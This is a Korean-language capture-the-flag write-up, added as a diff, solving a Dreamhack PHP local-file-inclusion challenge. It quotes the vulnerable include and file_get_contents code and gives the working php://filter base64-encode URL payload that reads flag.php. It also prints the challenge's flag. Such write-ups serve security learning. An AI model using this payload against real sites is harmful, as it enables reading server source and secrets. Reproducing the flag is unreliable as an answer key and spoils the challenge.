@@ -1,0 +1,147 @@
+base64 : PD9waHAKCSRmbGFnID0gJ0RIe2JiOWRiMWYzMDNjYWNmMGYzYzkxZTBhYmNhMTIyMWZmfSc7Cj8+CmNhbiB5b3Ugc2VlICRmbGFnPw==
+decode 답 : 
+    <?php
+        $flag = 'DH{bb9db1f303cacf0f3c91e0abca1221ff}';
+    ?>
+    can you see $flag?
+    
+플래그는 /var/www/uploads/flag.php에 있다.
+이 플래그를 보기 위해 flag.php를 불러와야 이 안의 내용을 확인할 수 있는데
+
+LFI 취약점이니 php의 include를 이용하면 된다.
+include는 index.php에 있으니 처음 나오는 메인 페이지에서 시도하면 된다.
+        
+        <?php
+          include $_GET['page']?$_GET['page'].'.php':'main.php';
+        ?>
+    
+위의 코드를 보면 만약 page 값이 있을시 page의 값 뒤에 .php를 붙여서 include 함수가 php 파일을 불러오고 page의 값이 없을시 main.php를 불러오는 것을 알 수 있다.
+
+php include 취약점은 다음과 같이 사용할 수 있다.
+    url?page=value
+
+이 value 값은 우리가 원하는 파일의 path를 적으면 된다.
+
+flag는 /var/www/uploads/flag.php 에 있으므로 value는 /var/www/uploads/flag를 입력한다.
+page값이 입력되면 뒤에 .php를 붙여주기 떄문에 /var/www/uploads/flag.php으로 적지 않고 .php부분을 뺴서 적어준다.
+
+그런데 이렇게 입력하면 화면에서는 can you see $flag? 만 보여준다.
+php태그와 comment처리된 코드들은 화면에 보여지지 않고 html부분만 보여주기 때문이다.
+
+이 경우 php wrapper를 사용해 code 부분을 전부 불러와야 한다.
+
+php://filter의 경우, 서버안의 문서들을 열람할 수 있게 해준다.
+
+flag.php를 filter/read=convert.base64-encode를 사용해 불러오면 코드 전체가 base64로 인코딩되서 코드 전체를 얻을 수 있다.
+코드가 인코딩 될 때 php 태그나 comment의 //가 사라지기 떄문인 것 같다.
+
+http://host1.dreamhack.games:17514/?page=php://filter/read=convert.base64-encode/resource=/var/www/uploads/flag
+
+으로 입력하면 base64로 인코딩된 flag.php파일의 코드를 얻을 수 있다.
+
+그러면 인코딩된 값인PD9waHAKCSRmbGFnID0gJ0RIe2JiOWRiMWYzMDNjYWNmMGYzYzkxZTBhYmNhMTIyMWZmfSc7Cj8+CmNhbiB5b3Ugc2VlICRmbGFnPw==
+을 얻을 수 있고, 
+
+이걸 decode 하면
+
+<?php
+    $flag = 'DH{bb9db1f303cacf0f3c91e0abca1221ff}';
+?>
+can you see $flag?
+
+flag를 얻을 수 있다.
+
+
+다른 사람 답 :
+    LFI(Local File Inclusion) 취약점이 있다고 해서 제일 먼저
+
+    http://host2.dreamhack.games:19754/?page=view&file=../uploads/flag.php (그리고 /var/www/uploads/flag.php)
+    와 같은 방식으로 들어갔으나 실패했다(이렇게 된다면 문제의 의미가 없겠지만…;;)
+
+    따라서 LFI에서 자주 나오는 PHP wrapper 방식을 응용,
+
+    http://host2.dreamhack.games:19754/?page=view&file=**php://filter/convert.base64-encode/resource=**/var/www/uploads/flag.php
+    로 시도했으나 역시 실패했다.
+
+    혹시 몰라서 다른 워게임 사이트인 webhacking.kr 25번 문제를 보다가
+    file= 등 다른 변수가 아닌 page=에다가 바로 PHP wrapper를 씌우는 것을 보고 힌트를 얻어서
+
+    http://host2.dreamhack.games:19754/?page=php://filter/convert.base64-encode/resource=/var/www/uploads/flag
+    과 같이 시도했고, 다음과 같은 flag가 나오는 것을 볼 수 있었다.
+    flag모양이 조금 이상한데, 이는 PHP wrapper에서 "base64-encode"라고 썼기 때문에 base-64 인코딩 방식으로 값이 변환되었기 때문이다.
+
+
+        PD9waHAKCSRmbGFnID0gJ0RIe2JiOWRiMWYzMDNjYWNmMGYzYzkxZTBhYmNhMTIyMWZmfSc7Cj8+CmNhbiB5b3Ugc2VlICRmbGFnPw==    
+    이 값은 인터넷에서 "base64-decoder"와 같이 검색해 온라인 무료 제공 툴을 이용하거나
+    웹 해킹 도구인 버프스위트(burp suite)에서 제공하는 decoder 도구를 이용하는 등 자유로운 툴을 쓰면 된다.
+    디코딩 결과,
+
+
+        <?php
+        $flag = 'DH{bb9db1f303cacf0f3c91e0abca1221ff}';
+    ?>
+    can you see $flag?    
+    Yes, I can see the $flag $D
+
+    플래그가 나오는 것을 볼 수 있었다.
+
+    여기까지 오는데 도합 5시간은 걸렸을텐데 그중 98%는 삽질이라 믿어 의심치 않는다…
+
+
+
+
+    페이지 분석
+    문제 파일을 다운로드하면 총 4개의 php 파일이 다운로드 되며 접속 정보를 토대로 접속하였을 경우에는 Back Office라는 문자와 home, list, view 총 세 개의 메뉴가 상단에 존재하고 있습니다. home의 경우 가장 처음에 보여진 화면과 동일하며 list 메뉴를 선택할 경우 flag.php, hello.json 두 개의 파일이 있습니다. flag.php 파일을 클릭할 경우에는 permission denied가 뜨며 hello.json의 경우 파일의 내용이 display 됩니다.
+
+    처음에 view 메뉴에서 딱히 확인할 수 있는게 없어서 당황스러웠는데 알고보니 URL의 형식을 확인해보면 list에서 파일을 클릭하였을 때 page 변수의 값이 view로 바뀌는 것을 확인할 수 있었습니다.
+
+    http://host1.dreamhack.games:17035/?page=view&file=../uploads/hello.json
+
+    코드 분석
+    기본적인 페이지의 동작은 파악되었기에 소스코드를 확인해보았습니다.
+
+    index.php
+    먼저 메인 페이지인 index.php 파일의 경우 아래와 같이 include를 통해 page를 로드하고 있는 것을 확인할 수 있었습니다.
+
+    <?php
+            include $_GET['page']?$_GET['page'].'.php':'main.php';
+        ?>
+    이 코드는 이전 동작 분석에서 유추할 수 있었듯이 page를 변경시켜주는 역할임을 알 수 있었습니다. include 함수에 대해서는 알고 있었으나 위와 같은 사용에 대해서는 처음 봤는데 아래와 같이 동작을 정리하였습니다.
+    GET 방식으로 page라는 변수에 값을 받고(? 앞부분), 이 값에 .php라는 문자열을 추가한다.(? 뒤 ~ : 앞) 이 때, 입력값이 없을 경우 main.php 파일을 불러온다
+
+    정리하다보니 삼항 연산자의 연장과 같은 것으로 보입니다.
+
+    main.php
+    main.php 파일의 경우 html code만 있기 때문에 자세한 분석은 하지 않았습니다.
+
+    list.php
+    list.php 파일은 php code를 포함하고 있으나 문제 풀이에서 필요한 code는 아니기에 생략하였습니다.
+
+    view.php
+    view.php의 경우 아래와 같이 include 함수를 사용하는 php code가 있었습니다.
+
+    <?php
+        $file = $_GET['file']?$_GET['file']:'';
+        if(preg_match('/flag|:/i', $file)){
+            exit('Permission denied');
+        }
+        echo file_get_contents($file);
+    ?>
+    이 때 GET 방식으로 받아온 값에 대해 flag 혹은 : 문자가 있을 경우 Permission Denied를 출력하는 것을 확인할 수 있었습니다. 따라서 이전에 list에서 flag.php 파일을 선택하였을 때 Permission Denied가 뜬 이유를 여기서 확인할 수 있었습니다.
+
+    문제 해결
+    : 문자를 필터링 하는 것을 통해 wrapper를 사용하는 것인가 생각하였었으나 제대로 공격으로 잇지 못하였으나 조금의 삽질 이후에 결국 wrapper를 사용하는 것이란 것을 알고 문제를 풀이할 수 있었습니다.
+
+    wrapper를 사용하는 부분의 경우 page 변수에 입력하여 사용할 수 있었습니다. 처음에는 file://을 사용하여 진행하였으나 php 파일을 open 할 때 이를 실행시켜서 can you see $flag라는 문자가 출력 되었습니다. 따라서 정확한 flag를 획득하기 위해서는 전제 source code를 확인할 필요가 있다는 것을 알게 되어 php://filter/convert.base64-encode/resource=<filename>와 같은 형식으로 출력 후 decoding 하여 flag를 획득하였습니다.
+
+    이 때도 filename에 그냥 flag라고 적었다가 제대로 출력되지 않아서 절대 경로로 입력하여 얻을 수 있었습니다.
+
+
+
+
+
+
+
+
+
+
